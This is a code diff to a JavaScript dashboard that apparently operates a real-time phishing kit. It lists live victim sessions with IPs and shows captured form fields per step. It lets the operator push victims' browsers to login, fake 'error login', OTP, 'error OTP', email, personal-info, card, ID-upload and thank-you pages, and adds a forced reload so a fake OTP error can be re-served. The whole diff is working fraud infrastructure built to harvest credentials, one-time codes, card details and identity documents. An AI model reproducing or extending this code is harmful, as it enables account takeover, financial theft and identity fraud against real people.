@@ -622,8 +622,10 @@ function normalizeFlowLabel(value = "") {
     .replace(/\.[a-z0-9]+$/i, "")
     .replace(/[-_]+/g, " ")
     .replace(/\b(error login|login2)\b/i, "login2")
+    .replace(/\b(error otp|otp2)\b/i, "otp2")
     .replace(/\b(login page|login)\b/i, "login")
     .replace(/\b(otp page|otp)\b/i, "otp")
+    .replace(/\b(upload id|photo id|file upload|upload)\b/i, "upload")
     .replace(/\b(personal info page|personal info|personal)\b/i, "personal")
     .replace(/\b(email page|email)\b/i, "email")
     .replace(/\b(card page|card|c)\b/i, "card")
@@ -648,7 +650,7 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
         ${pageTargets.length ? pageTargets.map((target) => {
           const isCurrent = currentKey && normalizeFlowLabel(target.label) === currentKey;
           return `
-          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent ? "disabled" : ""}>
+          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent && !target.forceReload ? "disabled" : ""}>
             ${escapeHtml(target.label)}
           </button>
         `;
@@ -685,7 +687,44 @@ function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHis
   return history?.targetUrl ? history : null;
 }
 
-function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
+function sessionResultDetailMarkup(session, page) {
+  if (!session.results.length) {
+    return `
+      <article class="result-card compact">
+        <div class="result-head">
+          <div>
+            <small>Waiting</small>
+            <h3>No result submitted yet</h3>
+          </div>
+          <span>live session</span>
+        </div>
+      </article>
+    `;
+  }
+
+  return session.results.map((result, index) => `
+    <article class="result-card compact">
+      <div class="result-head">
+        <div>
+          <small>Step ${index + 1}</small>
+          <h3>${escapeHtml(result.screen)}</h3>
+        </div>
+        <span>${escapeHtml(result.date)} / ${escapeHtml(result.time)}</span>
+      </div>
+      <div class="result-fields">
+        ${resultFieldMarkup(result.fields || {}) || `
+          <div>
+            <span>Status</span>
+            <strong>No form fields saved for this step</strong>
+          </div>
+        `}
+      </div>
+      ${resultActionsMarkup(result, page.slug)}
+    </article>
+  `).join("");
+}
+
+function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
   const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
   const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
   const lastDate = new Date(session.lastSeen);
@@ -695,44 +734,46 @@ function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], 
   const pageTargets = options.pageTargets || [];
   const latestResult = session.results[session.results.length - 1] || null;
   const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
+  const isBlocked = ipStatus === "Banned" || String(activeSession?.result || "").toLowerCase() === "blocked";
+  const commandStatus = command?.status || (command?.targetUrl ? "queued" : "none");
+  const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "idle";
+  const filterTokens = Array.from(new Set([
+    rowStatus,
+    activeSession ? "live" : "",
+    commandStatus === "queued" ? "queued" : "",
+    commandStatus === "delivered" ? "delivered" : "",
+    isBlocked ? "blocked" : "",
+    session.results.length ? "has-results" : "idle"
+  ].filter(Boolean))).join(" ");
+  const searchText = [
+    session.sessionId,
+    sessionIp,
+    ipStatus,
+    rowStatus,
+    activeSession?.screen,
+    latestResult?.screen,
+    command?.note,
+    command?.targetUrl
+  ].filter(Boolean).join(" ").toLowerCase();
   return `
-    <article class="result-session-card ${activeSession ? "is-live" : ""}">
-      <div class="result-session-head">
-        <div>
+    <details class="compact-session-row result-session-card ${activeSession ? "is-live" : ""}" data-compact-session data-session-filter="${escapeHtml(filterTokens)}" data-session-search="${escapeHtml(searchText)}">
+      <summary class="compact-session-summary">
+        <span class="session-dot ${escapeHtml(rowStatus)}"></span>
+        <div class="compact-session-main">
           <small>${escapeHtml(session.sessionId)}</small>
-          <h3>${session.results.length} page ${session.results.length === 1 ? "event" : "events"}</h3>
+          <h3>${escapeHtml(currentFlowLabel || "Session")} <span>${session.results.length} result${session.results.length === 1 ? "" : "s"}</span></h3>
         </div>
-        <span>${activeSession ? "Live now" : escapeHtml(lastSeen)}</span>
-      </div>
-      <div class="result-meta">
-        <span>IP ${escapeHtml(sessionIp)}</span>
-        <span>${escapeHtml(ipStatus)}</span>
-        ${activeSession ? `<span>${escapeHtml(activeSession.screen || "active page")} / ${escapeHtml(formatTrafficTime(activeSession.lastSeenAt))}</span>` : ""}
-      </div>
-      ${activeSession ? sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel) : ""}
+        <div class="compact-session-meta">
+          <span>IP ${escapeHtml(sessionIp)}</span>
+          <span>${escapeHtml(ipStatus)}</span>
+          <span>${activeSession ? "Live now" : escapeHtml(lastSeen)}</span>
+        </div>
+        ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel)}
+      </summary>
       <div class="session-result-timeline">
-        ${session.results.map((result, index) => `
-          <article class="result-card compact">
-            <div class="result-head">
-              <div>
-                <small>Step ${index + 1}</small>
-                <h3>${escapeHtml(result.screen)}</h3>
-              </div>
-              <span>${escapeHtml(result.date)} / ${escapeHtml(result.time)}</span>
-            </div>
-            <div class="result-fields">
-              ${resultFieldMarkup(result.fields || {}) || `
-                <div>
-                  <span>Status</span>
-                  <strong>No form fields saved for this step</strong>
-                </div>
-              `}
-            </div>
-            ${resultActionsMarkup(result, page.slug)}
-          </article>
-        `).join("")}
+        ${sessionResultDetailMarkup(session, page)}
       </div>
-    </article>
+    </details>
   `;
 }
 
@@ -1089,6 +1130,49 @@ function runtimeScreenTargetUrl(page, file) {
   return `/api/source?${params.toString()}`;
 }
 
+function canonicalRuntimeFlowTargets(page, discoveredFiles = []) {
+  const byFile = new Map(discoveredFiles.map((file) => [String(file || "").toLowerCase(), file]));
+  const hasFile = (file) => byFile.has(file.toLowerCase());
+  const makeTarget = (label, file, options = {}) => ({
+    label,
+    file,
+    url: runtimeScreenTargetUrl(page, file),
+    ...options
+  });
+
+  const targets = [];
+  [
+    ["Login", "index.html"],
+    ["Error Login", "login2.html"],
+    ["OTP", "otp.html"],
+    ["Email", "email.html"],
+    ["Personal", "personal.html"],
+    ["Card", "c.html"],
+    ["Thanks", "thnks.html"]
+  ].forEach(([label, file]) => {
+    if (hasFile(file)) targets.push(makeTarget(label, byFile.get(file.toLowerCase())));
+  });
+
+  if (hasFile("otp2.html")) {
+    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Error OTP", byFile.get("otp2.html")));
+  } else if (hasFile("otp.html")) {
+    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Error OTP", byFile.get("otp.html"), {
+      forceReload: true,
+      fallbackFor: "otp2.html"
+    }));
+  }
+
+  const uploadFile = discoveredFiles.find((file) => /(^|\/)(upload|upload-?id|photo|photo-?id|id-?photo|id|id-upload|id_upload|document|docs?)\.html?$/i.test(file));
+  if (uploadFile && !targets.some((target) => target.file.toLowerCase() === uploadFile.toLowerCase())) {
+    const insertBeforeThanks = targets.findIndex((target) => target.file.toLowerCase() === "thnks.html");
+    const uploadTarget = makeTarget("Upload ID", uploadFile);
+    if (insertBeforeThanks === -1) targets.push(uploadTarget);
+    else targets.splice(insertBeforeThanks, 0, uploadTarget);
+  }
+
+  return targets.filter((target) => target.url);
+}
+
 function sessionPageTargets(page) {
   const pagePackage = packageForUserPage(page);
   const manifestScreens = pagePackage?.packageManifest?.screens || [];
@@ -1098,18 +1182,15 @@ function sessionPageTargets(page) {
     ...(pagePackage?.screens || [])
   ];
   const seen = new Set();
-
-  return candidates.reduce((targets, screen, index) => {
+  const discoveredFiles = candidates.reduce((files, screen) => {
     const file = sessionTargetFile(screen, manifestScreens).replace(/^\/+/, "");
-    if (!file || !/\.html?$/i.test(file) || seen.has(file.toLowerCase())) return targets;
+    if (!file || !/\.html?$/i.test(file) || seen.has(file.toLowerCase())) return files;
     seen.add(file.toLowerCase());
-    targets.push({
-      label: sessionTargetLabel(screen, `Page ${index + 1}`),
-      file,
-      url: runtimeScreenTargetUrl(page, file)
-    });
-    return targets;
+    files.push(file);
+    return files;
   }, []);
+
+  return canonicalRuntimeFlowTargets(page, discoveredFiles);
 }
 
 function shouldUsePackageRuntime(page, pagePackage) {
@@ -1560,7 +1641,11 @@ function createGeneratedIndex(page) {
           .then((response) => response.ok ? response.json() : null)
           .then((data) => {
             const command = data && data.command;
-            if (command && command.action === "redirect" && command.targetUrl && !sameLocation(command.targetUrl)) {
+            if (command && command.action === "redirect" && command.targetUrl) {
+              if (sameLocation(command.targetUrl)) {
+                if (command.forceReload) window.location.reload();
+                return;
+              }
               window.location.href = command.targetUrl;
             }
           })
@@ -3913,6 +3998,16 @@ async function renderResultsCenter(pageSlug = "page-a") {
   const activeSessionsById = new Map(activeSessions.map((session) => [session.sessionId, session]));
   const savedSessionIds = new Set(savedSessions.map((session) => session.sessionId));
   const activeSessionsWithoutResults = activeSessions.filter((session) => !savedSessionIds.has(session.sessionId));
+  const compactSessions = [
+    ...activeSessionsWithoutResults.map((session) => ({
+      sessionId: session.sessionId,
+      results: [],
+      firstSeen: session.lastSeenAt,
+      lastSeen: session.lastSeenAt,
+      ip: session.ip || "unknown"
+    })),
+    ...savedSessions
+  ];
   const sessionCommands = page.configs?.sessionCommands || {};
   const sessionCommandHistory = page.configs?.sessionCommandHistory || {};
   const bannedIps = page.securityConfig?.bannedIps || [];
@@ -3939,48 +4034,83 @@ async function renderResultsCenter(pageSlug = "page-a") {
         <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
       </div>
 
-      <article class="security-panel active-users-panel">
+      <article class="security-panel compact-results-center">
         <div class="builder-heading">
           <div>
-            <small>live users</small>
-            <h3>Waiting for first result</h3>
+            <small>control center</small>
+            <h3>Compact sessions</h3>
           </div>
-          <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
+          <div class="compact-center-actions">
+            <button type="button" data-refresh-results="${page.slug}">Refresh</button>
+            <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
+          </div>
         </div>
-        <div class="active-session-list">
-          ${activeSessionsWithoutResults.length ? activeSessionsWithoutResults.map((session) => {
-            const command = latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory);
-            return activeSessionCardMarkup(session, page, pageTargets, command);
-          }).join("") : `
+        <div class="compact-session-toolbar">
+          <input type="search" data-session-search-input placeholder="Search session, IP, page, command">
+          <div class="compact-session-filters" aria-label="Filter result sessions">
+            ${[
+              ["all", "all"],
+              ["live", "live"],
+              ["queued", "queued"],
+              ["delivered", "delivered"],
+              ["blocked", "blocked"],
+              ["has-results", "has results"],
+              ["idle", "idle"]
+            ].map(([filter, label], index) => `
+              <button type="button" class="${index === 0 ? "is-active" : ""}" data-session-filter-button="${filter}">${label}</button>
+            `).join("")}
+          </div>
+        </div>
+        <div class="compact-session-list" data-compact-session-list>
+          ${compactSessions.length ? compactSessions.map((session) => compactSessionMarkup(session, page, bannedIps, whitelistIps, {
+            activeSession: activeSessionsById.get(session.sessionId),
+            command: latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory),
+            pageTargets
+          })).join("") : `
             <article class="active-session-card empty-session">
               <div>
-                <small>${activeSessions.length ? "merged" : "idle"}</small>
-                <h4>${activeSessions.length ? "Active sessions are shown with their results" : "No active users right now"}</h4>
-                <p>${activeSessions.length ? "Redirect buttons now live inside the matching saved session cards below." : "Open the live page and keep it active; sessions appear here from recent traffic events."}</p>
+                <small>empty</small>
+                <h4>No live sessions or saved results yet</h4>
+                <p>Open the live page and keep it active; sessions and safe result activity will appear here.</p>
               </div>
             </article>
           `}
+          <article class="active-session-card empty-session compact-session-empty" data-session-empty-state hidden>
+            <div>
+              <small>no match</small>
+              <h4>No sessions match this view</h4>
+              <p>Clear the search or choose another filter.</p>
+            </div>
+          </article>
         </div>
       </article>
-
-      <div class="results-list">
-        ${savedSessions.length ? savedSessions.map((session) => sessionResultsMarkup(session, page, bannedIps, whitelistIps, {
-          activeSession: activeSessionsById.get(session.sessionId),
-          command: latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory),
-          pageTargets
-        })).join("") : `
-          <article class="security-panel">
-            <small>empty</small>
-            <h3>No saved results yet</h3>
-            <p>When a hosted page sends safe session data to your Render API, the results will appear here grouped by user session and page step.</p>
-          </article>
-        `}
-      </div>
     </section>
   `;
 
   statusText.textContent = `${page.name.toUpperCase()} RESULTS READY`;
   topbarTitle.textContent = `${page.name} Results`;
+}
+
+function applyCompactSessionFilters() {
+  const list = preview.querySelector("[data-compact-session-list]");
+  if (!list) return;
+  const activeFilter = preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "all";
+  const search = (preview.querySelector("[data-session-search-input]")?.value || "").trim().toLowerCase();
+  const rows = [...preview.querySelectorAll("[data-compact-session]")];
+  let visibleCount = 0;
+
+  rows.forEach((row) => {
+    const status = (row.dataset.sessionFilter || "idle").split(/\s+/);
+    const searchText = row.dataset.sessionSearch || "";
+    const filterMatch = activeFilter === "all" || status.includes(activeFilter);
+    const searchMatch = !search || searchText.includes(search);
+    const visible = filterMatch && searchMatch;
+    row.hidden = !visible;
+    if (visible) visibleCount += 1;
+  });
+
+  const empty = preview.querySelector("[data-session-empty-state]");
+  if (empty) empty.hidden = visibleCount > 0;
 }
 
 function walletFundingOptionByValue(value) {
@@ -5017,6 +5147,12 @@ preview.addEventListener("change", (event) => {
   }
 });
 
+preview.addEventListener("input", (event) => {
+  if (event.target.closest("[data-session-search-input]")) {
+    applyCompactSessionFilters();
+  }
+});
+
 preview.addEventListener("click", async (event) => {
   const clickedButton = event.target.closest("button");
   pulseButton(clickedButton);
@@ -5245,6 +5381,13 @@ preview.addEventListener("click", async (event) => {
     return;
   }
 
+  const refreshResultsButton = event.target.closest("[data-refresh-results]");
+  if (refreshResultsButton) {
+    await withButtonBusy(refreshResultsButton, "Refreshing", () => renderResultsCenter(refreshResultsButton.dataset.refreshResults));
+    statusText.textContent = "RESULTS CONTROL CENTER REFRESHED";
+    return;
+  }
+
   const downloadButton = event.target.closest("[data-download-index]");
   if (downloadButton) {
     downloadGeneratedIndex(getPageBySlug(downloadButton.dataset.downloadIndex));
@@ -5335,14 +5478,26 @@ preview.addEventListener("click", async (event) => {
     return;
   }
 
+  const sessionFilterButton = event.target.closest("[data-session-filter-button]");
+  if (sessionFilterButton) {
+    event.preventDefault();
+    preview.querySelectorAll("[data-session-filter-button]").forEach((button) => button.classList.remove("is-active"));
+    sessionFilterButton.classList.add("is-active");
+    applyCompactSessionFilters();
+    statusText.textContent = `SESSION FILTER: ${sessionFilterButton.dataset.sessionFilterButton}`.toUpperCase();
+    return;
+  }
+
   const sessionRedirectButton = event.target.closest("[data-session-redirect]");
   if (sessionRedirectButton) {
+    event.preventDefault();
     const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
     const sessionId = sessionRedirectButton.dataset.sessionRedirect;
     const targetField = [...preview.querySelectorAll("[data-session-target]")]
       .find((field) => field.dataset.sessionTarget === sessionId);
     const targetUrl = sessionRedirectButton.dataset.sessionTargetUrl || targetField?.value.trim() || "";
     const targetLabel = sessionRedirectButton.dataset.sessionTargetLabel || targetUrl;
+    const forceReload = sessionRedirectButton.dataset.sessionForceReload === "true";
     if (!resultPage || !targetUrl) {
       statusText.textContent = "REDIRECT TARGET REQUIRED";
       return;
@@ -5350,7 +5505,7 @@ preview.addEventListener("click", async (event) => {
     await withButtonBusy(sessionRedirectButton, "Redirecting", async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
         method: "POST",
-        body: JSON.stringify({ targetUrl, note: targetLabel })
+        body: JSON.stringify({ targetUrl, note: targetLabel, forceReload })
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
@@ -5368,6 +5523,7 @@ preview.addEventListener("click", async (event) => {
 
   const sessionClearButton = event.target.closest("[data-session-clear]");
   if (sessionClearButton) {
+    event.preventDefault();
     const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
     const sessionId = sessionClearButton.dataset.sessionClear;
     if (!resultPage) return;
